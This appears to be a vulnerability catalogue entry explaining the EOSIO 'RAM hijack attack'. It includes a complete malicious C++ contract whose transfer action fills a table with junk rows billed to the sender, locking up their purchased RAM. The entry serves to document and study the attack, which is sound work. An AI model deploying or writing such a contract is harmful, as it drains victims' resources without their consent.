## Description

This attack is named as `RAM hijack attack`. In EOSIO, RAM is a type of resource to pay for the storing of permanent resources. Moreover, the RAM can be paid by other users. Therefore, attackers can abuse such a feature.

## Attack instance

The below code snippet shows a malicious code snippet:

```c++
class dataStorage : public eosio::contract {
  [[eosio::action]] void transfer(name from, name to, asset quantity, std::string memo) {
    // instantiate a multi_index table
    _ttab ttabs(_self,_self);

    for (int i = 0; i < 1000; i++) {
    // The first parameter specifies the account that would pay for any used RAM
    ttabs.emplace(from, [&](auto& data){ 
      // places junk data into the table
      data.id = i;
    });
    }
  }
};
EOSIO_API(dataStorage, (transfer)) //Handles the transfer function
```

We can see that, to perform RAM hijacking, attackers first lure victims to transfer EOS tokens to them. Once the victim initiates a transfer, the harmful *transfer* shown above will be invoked, where it inserts meaningless data into the table, and it charge the RAM from `from`, i.e., the victim.

According to [an experiment](https://www.apriorit.com/dev-blog/576-eos-ram-exploit), such a 1,000 rows of data takes 100KB of RAM, around $50.
Occupied RAM cannot be released, nor sold to others, victims have to wait for attackers to actively clear the table and free up RAM resources.
